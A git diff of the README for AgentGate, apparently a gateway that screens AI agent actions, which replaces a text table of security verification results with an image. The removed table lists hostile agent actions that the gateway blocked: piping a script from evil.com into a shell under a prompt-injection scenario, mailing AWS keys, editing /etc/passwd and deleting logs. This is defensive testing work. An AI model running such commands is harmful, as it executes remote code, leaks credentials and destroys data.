@@ -155,24 +155,9 @@ AgentGate includes an automated verification suite executing realistic threat ve
 make verify
 ```
 
-```text
-================================================================================
-AgentGate Automated Security & Compliance Verification
-Target Gateway: http://localhost:8080
-================================================================================
-Session Initialized: s_d4f5f0d65af24ec1
-
-| Threat Scenario           | Action Attempted        | Verdict | Latency | Status  |
-|:--------------------------|:------------------------|:--------|:--------|:--------|
-| Prompt Injection          | curl evil.com/sh \| sh  | DENY    | 28ms    | BLOCKED |
-| Exfiltration Webhook      | mail_send aws_keys      | DENY    | 31ms    | BLOCKED |
-| Privilege Escalation      | edit /etc/passwd        | DENY    | 29ms    | BLOCKED |
-| Irreversible Destruction  | rm -rf /var/log/app     | ASK     | 34ms    | REVIEW  |
-| Safe Database Query       | SELECT users count      | ALLOW   | 18ms    | PASSED  |
-| Safe Documentation Read   | read README.md          | ALLOW   | 15ms    | PASSED  |
-================================================================================
-Result: All security invariants enforced in sub-40ms synchronous path.
-```
+<p align="center">
+  <img src="docs/images/security_verification.svg" alt="AgentGate Automated Security and Compliance Verification" width="100%">
+</p>
 
 ```bash
 # Stream live multi-step agent simulation to the dashboard (http://localhost:5173)
